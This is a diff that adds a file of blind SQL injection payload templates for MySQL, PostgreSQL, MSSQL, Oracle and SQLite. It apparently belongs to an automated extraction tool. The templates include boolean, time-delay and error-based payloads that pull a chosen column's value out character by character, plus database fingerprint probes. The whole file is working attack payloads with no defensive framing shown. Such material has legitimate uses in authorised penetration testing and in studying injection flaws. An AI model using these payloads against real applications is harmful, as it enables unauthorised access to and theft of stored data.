@@ -1,0 +1,52 @@
+# Blind SQLi extraction templates. {sql} is the sub-select returning the
+# value to extract, {pos} is the 1-based character position, {char} is the
+# ASCII code we compare against, {delay} is the sleep seconds, {table},
+# {column} are filled in by the caller.
+
+# MySQL boolean
+mysql_bool: "1' AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}-- -"
+mysql_bool_2: "1 AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}"
+mysql_bool_3: "1' AND ORD(MID((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}-- -"
+
+# MySQL time
+mysql_time: "1' AND IF(ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char},SLEEP({delay}),0)-- -"
+mysql_time_2: "1' OR IF(ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char},SLEEP({delay}),0)-- -"
+mysql_time_3: "1' AND (SELECT 1 FROM (SELECT SLEEP({delay}))x WHERE ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char})-- -"
+
+# MySQL error
+mysql_error: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {column} FROM {table} LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+mysql_error_2: "1' AND extractvalue(1,concat(0x7e,(SELECT {column} FROM {table} LIMIT 1),0x7e))-- -"
+
+# PostgreSQL boolean
+postgres_bool: "1' AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}--"
+postgres_bool_2: "1 AND ASCII(SUBSTRING(CAST((SELECT {column} FROM {table} LIMIT 1) AS TEXT),{pos},1))>{char}"
+
+# PostgreSQL time
+postgres_time: "1'; SELECT CASE WHEN ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char} THEN pg_sleep({delay}) ELSE pg_sleep(0) END--"
+postgres_time_2: "1' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char} THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--"
+
+# MSSQL boolean
+mssql_bool: "1' AND ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table}),{pos},1))>{char}--"
+mssql_bool_2: "1 AND ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table}),{pos},1))>{char}"
+
+# MSSQL time
+mssql_time: "1'; IF ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table}),{pos},1))>{char} WAITFOR DELAY '0:0:{delay}'--"
+mssql_time_2: "1' IF ASCII(SUBSTRING((SELECT TOP 1 {column} FROM {table}),{pos},1))>{char} WAITFOR DELAY '0:0:{delay}'--"
+
+# Oracle boolean
+oracle_bool: "1' AND ASCII(SUBSTR((SELECT {column} FROM {table} WHERE ROWNUM=1),{pos},1))>{char}--"
+oracle_bool_2: "1 AND ASCII(SUBSTR((SELECT {column} FROM {table} WHERE ROWNUM=1),{pos},1))>{char}"
+
+# Oracle time
+oracle_time: "1' AND (CASE WHEN ASCII(SUBSTR((SELECT {column} FROM {table} WHERE ROWNUM=1),{pos},1))>{char} THEN dbms_pipe.receive_message(('a'),{delay}) ELSE 0 END)={char}--"
+
+# SQLite boolean
+sqlite_bool: "1' AND UNICODE(SUBSTR((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}--"
+sqlite_bool_2: "1 AND UNICODE(SUBSTR((SELECT {column} FROM {table} LIMIT 1),{pos},1))>{char}"
+
+# Fingerprint probes
+fingerprint_mysql: "1' AND SLEEP(0)-- -"
+fingerprint_postgres: "1' AND pg_sleep(0)--"
+fingerprint_mssql: "1'; WAITFOR DELAY '0:0:0'--"
+fingerprint_oracle: "1' AND 1=1--"
+fingerprint_sqlite: "1' AND 1=1--"
